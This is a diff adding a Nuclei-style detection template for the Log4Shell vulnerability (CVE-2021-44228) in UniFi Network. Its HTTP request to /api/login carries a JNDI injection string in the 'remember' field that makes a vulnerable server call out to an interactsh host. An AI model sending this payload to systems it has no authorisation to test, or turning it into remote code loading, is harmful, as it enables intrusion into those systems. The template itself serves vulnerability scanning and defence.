@@ -1,0 +1,28 @@
+id: unifi-network-log4j2-rce
+info:
+  name: UniFi Network log4j2 RCE (CVE-2021-44228)
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    UniFi Network platform is vulnerable to log4j2 remote command execution. Attackers can exploit this vulnerability by constructing special request packets to trigger remote code execution.
+  reference:
+    - https://help.ui.com.cn/
+    - https://fofa.so
+  classification:
+    cve-id: CVE-2021-44228
+    cvss-metrics: 3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 10.0
+http:
+  - raw:
+      - |
+        POST /api/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json; charset=utf-8
+
+        {"username":"1234","password":"1234","remember":"${jndi:ldap://{{interactsh-url}}}","strict":true}
+    stop-at-first-match: true
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
